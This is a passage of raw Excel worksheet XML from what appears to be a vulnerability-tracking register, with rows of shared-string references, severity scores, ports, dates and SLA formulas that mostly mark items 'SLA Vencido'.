      <c r="N9" s="7">
        <v>5.3</v>
      </c>
      <c r="O9" s="6"/>
      <c r="P9" s="4"/>
      <c r="Q9" s="4" t="s">
        <v>2075</v>
      </c>
      <c r="R9" s="4"/>
      <c r="S9" s="22"/>
      <c r="T9" s="8">
        <v>45466</v>
      </c>
      <c r="U9" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>743</v>
      </c>
      <c r="V9" s="8">
        <f t="shared" si="1"/>
        <v>45556</v>
      </c>
      <c r="W9" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X9" s="12"/>
      <c r="Y9" s="30"/>
      <c r="Z9" s="30"/>
      <c r="AA9" s="8">
        <v>45675</v>
      </c>
      <c r="AB9" s="9" t="s">
        <v>2056</v>
      </c>
      <c r="AC9" s="32" t="s">
        <v>2057</v>
      </c>
      <c r="AD9" s="32" t="s">
        <v>2058</v>
      </c>
      <c r="AE9" s="27"/>
      <c r="AF9" s="9"/>
      <c r="AG9" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="10" spans="1:33" ht="409.5" x14ac:dyDescent="0.35">
      <c r="A10" s="5">
        <v>9</v>
      </c>
      <c r="B10" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C10" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D10" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E10" s="4"/>
      <c r="F10" s="4"/>
      <c r="G10" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H10" s="4" t="s">
        <v>2076</v>
      </c>
      <c r="I10" s="4"/>
      <c r="J10" s="4" t="s">
        <v>1800</v>
      </c>
      <c r="K10" s="4"/>
      <c r="L10" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M10" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N10" s="7">
        <v>5.8</v>
      </c>
      <c r="O10" s="6"/>
      <c r="P10" s="4"/>
      <c r="Q10" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R10" s="4">
        <v>443</v>
      </c>
      <c r="S10" s="22"/>
      <c r="T10" s="8">
        <v>45332</v>
      </c>
      <c r="U10" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>877</v>
      </c>
      <c r="V10" s="8">
        <f t="shared" si="1"/>
        <v>45422</v>
      </c>
      <c r="W10" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X10" s="12"/>
      <c r="Y10" s="30"/>
      <c r="Z10" s="30"/>
      <c r="AA10" s="8"/>
      <c r="AB10" s="9" t="s">
        <v>2078</v>
      </c>
      <c r="AC10" s="32" t="s">
        <v>2079</v>
      </c>
      <c r="AD10" s="32"/>
      <c r="AE10" s="70" t="s">
        <v>2080</v>
      </c>
      <c r="AF10" s="9"/>
      <c r="AG10" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="11" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A11" s="5">
        <v>10</v>
      </c>
      <c r="B11" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C11" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D11" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E11" s="4"/>
      <c r="F11" s="4"/>
      <c r="G11" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H11" s="9" t="s">
        <v>2081</v>
      </c>
      <c r="I11" s="9"/>
      <c r="J11" s="4" t="s">
        <v>1804</v>
      </c>
      <c r="K11" s="4"/>
      <c r="L11" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M11" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N11" s="7">
        <v>5.8</v>
      </c>
      <c r="O11" s="6"/>
      <c r="P11" s="4"/>
      <c r="Q11" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R11" s="4">
        <v>443</v>
      </c>
      <c r="S11" s="22"/>
      <c r="T11" s="8">
        <v>45332</v>
      </c>
      <c r="U11" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>877</v>
      </c>
      <c r="V11" s="8">
        <f t="shared" si="1"/>
        <v>45422</v>
      </c>
      <c r="W11" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X11" s="12"/>
      <c r="Y11" s="30"/>
      <c r="Z11" s="30"/>
      <c r="AA11" s="8"/>
      <c r="AB11" s="9" t="s">
        <v>2082</v>
      </c>
      <c r="AC11" s="32" t="s">
        <v>2083</v>
      </c>
      <c r="AD11" s="32"/>
      <c r="AE11" s="70" t="s">
        <v>2080</v>
      </c>
      <c r="AF11" s="9"/>
      <c r="AG11" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="12" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A12" s="5">
        <v>11</v>
      </c>
      <c r="B12" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C12" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D12" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E12" s="4"/>
      <c r="F12" s="4"/>
      <c r="G12" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H12" s="4" t="s">
        <v>2084</v>
      </c>
      <c r="I12" s="4"/>
      <c r="J12" s="4" t="s">
        <v>1390</v>
      </c>
      <c r="K12" s="4"/>
      <c r="L12" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M12" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N12" s="7">
        <v>5</v>
      </c>
      <c r="O12" s="6"/>
      <c r="P12" s="4"/>
      <c r="Q12" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R12" s="4">
        <v>443</v>
      </c>
      <c r="S12" s="22"/>
      <c r="T12" s="8">
        <v>45332</v>
      </c>
      <c r="U12" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>877</v>
      </c>
      <c r="V12" s="8">
        <f t="shared" si="1"/>
        <v>45422</v>
      </c>
      <c r="W12" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X12" s="12"/>
      <c r="Y12" s="30"/>
      <c r="Z12" s="30"/>
      <c r="AA12" s="8"/>
      <c r="AB12" s="9" t="s">
        <v>1392</v>
      </c>
      <c r="AC12" s="32" t="s">
        <v>1393</v>
      </c>
      <c r="AD12" s="32"/>
      <c r="AE12" s="70" t="s">
        <v>1384</v>
      </c>
      <c r="AF12" s="9"/>
      <c r="AG12" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="13" spans="1:33" ht="304.5" x14ac:dyDescent="0.35">
      <c r="A13" s="5">
        <v>12</v>
      </c>
      <c r="B13" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C13" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D13" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E13" s="4"/>
      <c r="F13" s="4"/>
      <c r="G13" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H13" s="4" t="s">
        <v>2085</v>
      </c>
      <c r="I13" s="4"/>
      <c r="J13" s="4" t="s">
        <v>239</v>
      </c>
      <c r="K13" s="4"/>
      <c r="L13" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M13" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N13" s="7">
        <v>5.3</v>
      </c>
      <c r="O13" s="6"/>
      <c r="P13" s="4"/>
      <c r="Q13" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R13" s="4">
        <v>443</v>
      </c>
      <c r="S13" s="22"/>
      <c r="T13" s="8">
        <v>45507</v>
      </c>
      <c r="U13" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>702</v>
      </c>
      <c r="V13" s="8">
        <f t="shared" si="1"/>
        <v>45597</v>
      </c>
      <c r="W13" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X13" s="12"/>
      <c r="Y13" s="30"/>
      <c r="Z13" s="30"/>
      <c r="AA13" s="8">
        <v>45678</v>
      </c>
      <c r="AB13" s="9" t="s">
        <v>2086</v>
      </c>
      <c r="AC13" s="32" t="s">
        <v>2087</v>
      </c>
      <c r="AD13" s="32"/>
      <c r="AE13" s="27"/>
      <c r="AF13" s="9"/>
      <c r="AG13" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="14" spans="1:33" ht="409.5" x14ac:dyDescent="0.35">
      <c r="A14" s="5">
        <v>13</v>
      </c>
      <c r="B14" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C14" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D14" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E14" s="4"/>
      <c r="F14" s="4"/>
      <c r="G14" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H14" s="4" t="s">
        <v>2088</v>
      </c>
      <c r="I14" s="4"/>
      <c r="J14" s="4" t="s">
        <v>1800</v>
      </c>
      <c r="K14" s="4"/>
      <c r="L14" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M14" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N14" s="7">
        <v>5.8</v>
      </c>
      <c r="O14" s="6"/>
      <c r="P14" s="4"/>
      <c r="Q14" s="4" t="s">
        <v>2089</v>
      </c>
      <c r="R14" s="4">
        <v>443</v>
      </c>
      <c r="S14" s="22"/>
      <c r="T14" s="8">
        <v>45272</v>
      </c>
      <c r="U14" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>937</v>
      </c>
      <c r="V14" s="8">
        <f t="shared" si="1"/>
        <v>45362</v>
      </c>
      <c r="W14" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X14" s="12"/>
      <c r="Y14" s="30"/>
      <c r="Z14" s="30"/>
      <c r="AA14" s="8"/>
      <c r="AB14" s="9" t="s">
        <v>2078</v>
      </c>
      <c r="AC14" s="32" t="s">
        <v>2079</v>
      </c>
      <c r="AD14" s="32"/>
      <c r="AE14" s="70" t="s">
        <v>2080</v>
      </c>
      <c r="AF14" s="9"/>
      <c r="AG14" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="15" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A15" s="5">
        <v>14</v>
      </c>
      <c r="B15" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C15" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D15" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E15" s="4"/>
      <c r="F15" s="4"/>
      <c r="G15" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H15" s="6" t="s">
        <v>2090</v>
      </c>
      <c r="I15" s="6"/>
      <c r="J15" s="4" t="s">
        <v>1804</v>
      </c>
      <c r="K15" s="4"/>
      <c r="L15" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M15" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N15" s="7">
        <v>5.8</v>
      </c>
      <c r="O15" s="6"/>
      <c r="P15" s="4"/>
      <c r="Q15" s="4" t="s">
        <v>2089</v>
      </c>
      <c r="R15" s="4">
        <v>443</v>
      </c>
      <c r="S15" s="22"/>
      <c r="T15" s="8">
        <v>45272</v>
      </c>
      <c r="U15" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>937</v>
      </c>
      <c r="V15" s="8">
        <f t="shared" si="1"/>
        <v>45362</v>
      </c>
      <c r="W15" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X15" s="12"/>
      <c r="Y15" s="12"/>
      <c r="Z15" s="12"/>
      <c r="AA15" s="8"/>
      <c r="AB15" s="9" t="s">
        <v>2082</v>
      </c>
      <c r="AC15" s="32" t="s">
        <v>2083</v>
      </c>
      <c r="AD15" s="32"/>
      <c r="AE15" s="70" t="s">
        <v>2080</v>
      </c>
      <c r="AF15" s="9"/>
      <c r="AG15" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="16" spans="1:33" ht="409.5" x14ac:dyDescent="0.35">
      <c r="A16" s="5">
        <v>15</v>
      </c>
      <c r="B16" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C16" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D16" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E16" s="4"/>
      <c r="F16" s="4"/>
      <c r="G16" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H16" s="6" t="s">
        <v>2091</v>
      </c>
      <c r="I16" s="6"/>
      <c r="J16" s="4" t="s">
        <v>1800</v>
      </c>
      <c r="K16" s="4"/>
      <c r="L16" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M16" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N16" s="7">
        <v>5.8</v>
      </c>
      <c r="O16" s="6"/>
      <c r="P16" s="4"/>
      <c r="Q16" s="4" t="s">
        <v>2092</v>
      </c>
      <c r="R16" s="4">
        <v>443</v>
      </c>
      <c r="S16" s="22"/>
      <c r="T16" s="8">
        <v>45486</v>
      </c>
      <c r="U16" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>723</v>
      </c>
      <c r="V16" s="8">
        <f t="shared" si="1"/>
        <v>45576</v>
      </c>
      <c r="W16" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X16" s="12"/>
      <c r="Y16" s="12"/>
      <c r="Z16" s="12"/>
      <c r="AA16" s="8">
        <v>45748</v>
      </c>
      <c r="AB16" s="9" t="s">
        <v>2078</v>
      </c>
      <c r="AC16" s="32" t="s">
        <v>2079</v>
      </c>
      <c r="AD16" s="32"/>
      <c r="AE16" s="27" t="s">
        <v>2093</v>
      </c>
      <c r="AF16" s="9"/>
      <c r="AG16" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="17" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A17" s="5">
        <v>16</v>
      </c>
      <c r="B17" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C17" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D17" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E17" s="4"/>
      <c r="F17" s="4"/>
      <c r="G17" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H17" s="6" t="s">
        <v>2094</v>
      </c>
      <c r="I17" s="6"/>
      <c r="J17" s="4" t="s">
        <v>1804</v>
      </c>
      <c r="K17" s="4"/>
      <c r="L17" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M17" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N17" s="7">
        <v>5.8</v>
      </c>
      <c r="O17" s="6"/>
      <c r="P17" s="4"/>
      <c r="Q17" s="4" t="s">
        <v>2092</v>
      </c>
      <c r="R17" s="4">
        <v>443</v>
      </c>
      <c r="S17" s="22"/>
      <c r="T17" s="8">
        <v>45486</v>
      </c>
      <c r="U17" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>723</v>
      </c>
      <c r="V17" s="8">
        <f t="shared" si="1"/>
        <v>45576</v>
      </c>
      <c r="W17" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X17" s="12"/>
      <c r="Y17" s="12"/>
      <c r="Z17" s="12"/>
      <c r="AA17" s="8"/>
      <c r="AB17" s="9" t="s">
        <v>2082</v>
      </c>
      <c r="AC17" s="32" t="s">
        <v>2083</v>
      </c>
      <c r="AD17" s="32"/>
      <c r="AE17" s="70" t="s">
        <v>2093</v>
      </c>
      <c r="AF17" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG17" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="18" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A18" s="5">
        <v>17</v>
      </c>
      <c r="B18" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C18" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D18" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E18" s="4"/>
      <c r="F18" s="4"/>
      <c r="G18" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H18" s="6" t="s">
        <v>2097</v>
      </c>
      <c r="I18" s="6" t="s">
        <v>2098</v>
      </c>
      <c r="J18" s="4" t="s">
        <v>91</v>
      </c>
      <c r="K18" s="4"/>
      <c r="L18" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M18" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N18" s="7">
        <v>4.5999999999999996</v>
      </c>
      <c r="O18" s="6"/>
      <c r="P18" s="4"/>
      <c r="Q18" s="4" t="s">
        <v>2099</v>
      </c>
      <c r="R18" s="4">
        <v>4443</v>
      </c>
      <c r="S18" s="22"/>
      <c r="T18" s="8">
        <v>45483</v>
      </c>
      <c r="U18" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>726</v>
      </c>
      <c r="V18" s="8">
        <f t="shared" si="1"/>
        <v>45573</v>
      </c>
      <c r="W18" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X18" s="12"/>
      <c r="Y18" s="12"/>
      <c r="Z18" s="12"/>
      <c r="AA18" s="8"/>
      <c r="AB18" s="9" t="s">
        <v>2100</v>
      </c>
      <c r="AC18" s="32" t="s">
        <v>2101</v>
      </c>
      <c r="AD18" s="32" t="s">
        <v>2102</v>
      </c>
      <c r="AE18" s="71" t="s">
        <v>2080</v>
      </c>
      <c r="AF18" s="9"/>
      <c r="AG18" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="19" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A19" s="5">
        <v>18</v>
      </c>
      <c r="B19" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C19" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D19" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E19" s="4"/>
      <c r="F19" s="4"/>
      <c r="G19" s="6" t="s">
        <v>2103</v>
      </c>
      <c r="H19" s="4" t="s">
        <v>2104</v>
      </c>
      <c r="I19" s="6" t="s">
        <v>2105</v>
      </c>
      <c r="J19" s="4" t="s">
        <v>2106</v>
      </c>
      <c r="K19" s="4"/>
      <c r="L19" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M19" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N19" s="7">
        <v>4.2</v>
      </c>
      <c r="O19" s="6"/>
      <c r="P19" s="4"/>
      <c r="Q19" s="6" t="s">
        <v>2107</v>
      </c>
      <c r="R19" s="4"/>
      <c r="S19" s="22"/>
      <c r="T19" s="8">
        <v>45449</v>
      </c>
      <c r="U19" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>760</v>
      </c>
      <c r="V19" s="8">
        <f t="shared" si="1"/>
        <v>45539</v>
      </c>
      <c r="W19" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X19" s="12"/>
      <c r="Y19" s="30"/>
      <c r="Z19" s="30"/>
      <c r="AA19" s="8"/>
      <c r="AB19" s="9" t="s">
        <v>2108</v>
      </c>
      <c r="AC19" s="32" t="s">
        <v>2109</v>
      </c>
      <c r="AD19" s="32" t="s">
        <v>2110</v>
      </c>
      <c r="AE19" s="8"/>
      <c r="AF19" s="4"/>
      <c r="AG19" s="27" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="20" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A20" s="5">
        <v>19</v>
      </c>
      <c r="B20" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C20" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D20" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E20" s="4"/>
      <c r="F20" s="4"/>
      <c r="G20" s="6" t="s">
        <v>2045</v>
      </c>
      <c r="H20" s="4" t="s">
        <v>2111</v>
      </c>
      <c r="I20" s="6" t="s">
        <v>2112</v>
      </c>
      <c r="J20" s="4" t="s">
        <v>870</v>
      </c>
      <c r="K20" s="4"/>
      <c r="L20" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M20" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N20" s="7">
        <v>4.2</v>
      </c>
      <c r="O20" s="6"/>
      <c r="P20" s="4"/>
      <c r="Q20" s="6" t="s">
        <v>2113</v>
      </c>
      <c r="R20" s="4">
        <v>8001</v>
      </c>
      <c r="S20" s="22"/>
      <c r="T20" s="8">
        <v>45447</v>
      </c>
      <c r="U20" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>762</v>
      </c>
      <c r="V20" s="8">
        <f t="shared" si="1"/>
        <v>45537</v>
      </c>
      <c r="W20" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X20" s="12"/>
      <c r="Y20" s="30"/>
      <c r="Z20" s="30"/>
      <c r="AA20" s="13"/>
      <c r="AB20" s="9" t="s">
        <v>1215</v>
      </c>
      <c r="AC20" s="32" t="s">
        <v>1170</v>
      </c>
      <c r="AD20" s="32" t="s">
        <v>1216</v>
      </c>
      <c r="AE20" s="70" t="s">
        <v>2114</v>
      </c>
      <c r="AF20" s="8"/>
      <c r="AG20" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="21" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A21" s="5">
        <v>20</v>
      </c>
      <c r="B21" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C21" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D21" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E21" s="4"/>
      <c r="F21" s="4"/>
      <c r="G21" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H21" s="4" t="s">
        <v>2115</v>
      </c>
      <c r="I21" s="6" t="s">
        <v>2116</v>
      </c>
      <c r="J21" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K21" s="4"/>
      <c r="L21" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M21" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N21" s="7">
        <v>4.3</v>
      </c>
      <c r="O21" s="6"/>
      <c r="P21" s="4"/>
      <c r="Q21" s="6" t="s">
        <v>2077</v>
      </c>
      <c r="R21" s="4">
        <v>443</v>
      </c>
      <c r="S21" s="22"/>
      <c r="T21" s="8">
        <v>45439</v>
      </c>
      <c r="U21" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>770</v>
      </c>
      <c r="V21" s="8">
        <f t="shared" si="1"/>
        <v>45529</v>
      </c>
      <c r="W21" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X21" s="12"/>
      <c r="Y21" s="12"/>
      <c r="Z21" s="12"/>
      <c r="AA21" s="8"/>
      <c r="AB21" s="9" t="s">
        <v>2117</v>
      </c>
      <c r="AC21" s="32" t="s">
        <v>2118</v>
      </c>
      <c r="AD21" s="32" t="s">
        <v>2119</v>
      </c>
      <c r="AE21" s="70" t="s">
        <v>2080</v>
      </c>
      <c r="AF21" s="4"/>
      <c r="AG21" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="22" spans="1:33" ht="304.5" x14ac:dyDescent="0.35">
      <c r="A22" s="5">
        <v>21</v>
      </c>
      <c r="B22" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C22" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D22" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E22" s="4"/>
      <c r="F22" s="4"/>
      <c r="G22" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H22" s="4" t="s">
        <v>2120</v>
      </c>
      <c r="I22" s="6" t="s">
        <v>2121</v>
      </c>
      <c r="J22" s="4" t="s">
        <v>2122</v>
      </c>
      <c r="K22" s="4"/>
      <c r="L22" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M22" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N22" s="7">
        <v>6.4</v>
      </c>
      <c r="O22" s="6"/>
      <c r="P22" s="4"/>
      <c r="Q22" s="6" t="s">
        <v>2089</v>
      </c>
      <c r="R22" s="4">
        <v>443</v>
      </c>
      <c r="S22" s="22"/>
      <c r="T22" s="8">
        <v>45439</v>
      </c>
      <c r="U22" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>770</v>
      </c>
      <c r="V22" s="8">
        <f t="shared" si="1"/>
        <v>45529</v>
      </c>
      <c r="W22" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X22" s="12"/>
      <c r="Y22" s="12"/>
      <c r="Z22" s="12"/>
      <c r="AA22" s="8">
        <v>45679</v>
      </c>
      <c r="AB22" s="9" t="s">
        <v>2123</v>
      </c>
      <c r="AC22" s="32" t="s">
        <v>2124</v>
      </c>
      <c r="AD22" s="32" t="s">
        <v>2125</v>
      </c>
      <c r="AE22" s="27"/>
      <c r="AF22" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG22" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="23" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A23" s="5">
        <v>22</v>
      </c>
      <c r="B23" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C23" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D23" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E23" s="4"/>
      <c r="F23" s="4"/>
      <c r="G23" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H23" s="4" t="s">
        <v>2126</v>
      </c>
      <c r="I23" s="6" t="s">
        <v>2127</v>
      </c>
      <c r="J23" s="4" t="s">
        <v>2128</v>
      </c>
      <c r="K23" s="4"/>
      <c r="L23" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M23" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N23" s="7">
        <v>5.3</v>
      </c>
      <c r="O23" s="6"/>
      <c r="P23" s="4"/>
      <c r="Q23" s="6" t="s">
        <v>2089</v>
      </c>
      <c r="R23" s="4">
        <v>443</v>
      </c>
      <c r="S23" s="22"/>
      <c r="T23" s="8">
        <v>45439</v>
      </c>
      <c r="U23" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>770</v>
      </c>
      <c r="V23" s="8">
        <f t="shared" si="1"/>
        <v>45529</v>
      </c>
      <c r="W23" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X23" s="12"/>
      <c r="Y23" s="12"/>
      <c r="Z23" s="12"/>
      <c r="AA23" s="8"/>
      <c r="AB23" s="9" t="s">
        <v>2129</v>
      </c>
      <c r="AC23" s="35" t="s">
        <v>2130</v>
      </c>
      <c r="AD23" s="35" t="s">
        <v>2131</v>
      </c>
      <c r="AE23" s="27" t="s">
        <v>2132</v>
      </c>
      <c r="AF23" s="9" t="s">
        <v>2133</v>
      </c>
      <c r="AG23" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="24" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A24" s="5">
        <v>23</v>
      </c>
      <c r="B24" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C24" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D24" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E24" s="4"/>
      <c r="F24" s="4"/>
      <c r="G24" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H24" s="4" t="s">
        <v>2134</v>
      </c>
      <c r="I24" s="6" t="s">
        <v>2135</v>
      </c>
      <c r="J24" s="4" t="s">
        <v>2122</v>
      </c>
      <c r="K24" s="4"/>
      <c r="L24" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M24" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N24" s="7">
        <v>6.5</v>
      </c>
      <c r="O24" s="14" t="s">
        <v>2136</v>
      </c>
      <c r="P24" s="4"/>
      <c r="Q24" s="6" t="s">
        <v>2092</v>
      </c>
      <c r="R24" s="4"/>
      <c r="S24" s="22"/>
      <c r="T24" s="8">
        <v>45210</v>
      </c>
      <c r="U24" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>999</v>
      </c>
      <c r="V24" s="8">
        <f t="shared" si="1"/>
        <v>45300</v>
      </c>
      <c r="W24" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X24" s="12"/>
      <c r="Y24" s="12"/>
      <c r="Z24" s="12"/>
      <c r="AA24" s="8"/>
      <c r="AB24" s="9" t="s">
        <v>2137</v>
      </c>
      <c r="AC24" s="32" t="s">
        <v>2138</v>
      </c>
      <c r="AD24" s="32" t="s">
        <v>2139</v>
      </c>
      <c r="AE24" s="71" t="s">
        <v>2080</v>
      </c>
      <c r="AF24" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG24" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="25" spans="1:33" ht="73.5" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A25" s="5">
        <v>24</v>
      </c>
      <c r="B25" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C25" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D25" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E25" s="4"/>
      <c r="F25" s="4"/>
      <c r="G25" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H25" s="4" t="s">
        <v>2140</v>
      </c>
      <c r="I25" s="6" t="s">
        <v>2141</v>
      </c>
      <c r="J25" s="4" t="s">
        <v>2142</v>
      </c>
      <c r="K25" s="4"/>
      <c r="L25" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M25" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N25" s="7">
